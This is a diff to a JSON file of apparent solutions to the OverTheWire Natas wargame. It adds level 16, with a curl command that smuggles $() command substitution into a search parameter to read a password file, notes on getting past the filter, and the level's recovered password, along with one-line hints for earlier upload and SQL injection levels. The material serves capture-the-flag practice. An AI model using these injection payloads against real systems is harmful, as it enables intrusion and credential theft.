@@ -223,6 +223,22 @@
     "This user exists."
    ],
    "pw": "Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb"
+  },
+  {
+   "lvl": 16,
+   "user": "natas16",
+   "cmds": [
+    [
+     "# the filter blocks ; | & ` ' \" \u2014 but not $()",
+     "# if the grep inside $() matches, the output goes empty \u2014 a boolean oracle:",
+     "curl -s -u natas16:PASS 'http://natas16.natas.labs.overthewire.org/?needle=African$(grep ^K /etc/natas_webpass/natas17)&submit=Search'",
+     "# try every character at every position (double-confirmed) \u2014 32 requests chains later:"
+    ]
+   ],
+   "out": [
+    "<pre></pre>  (empty = prefix correct)"
+   ],
+   "pw": "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx"
   }
  ],
  "goals": {
@@ -241,6 +257,7 @@
   "12": "An upload form keeps your file's .php extension.",
   "13": "The upload now checks the file type with exif_imagetype \u2014 so make the PHP look like a GIF.",
   "14": "A login form builds its SQL query with your username inside it.",
-  "15": "The form only says whether a user exists \u2014 a blind SQL injection oracle. Brute-force the password through it."
+  "15": "The form only says whether a user exists \u2014 a blind SQL injection oracle. Brute-force the password through it.",
+  "16": "The dictionary search filters shell metacharacters but not $() command substitution \u2014 turn it into a yes/no oracle and extract the password character by character."
  }
 }
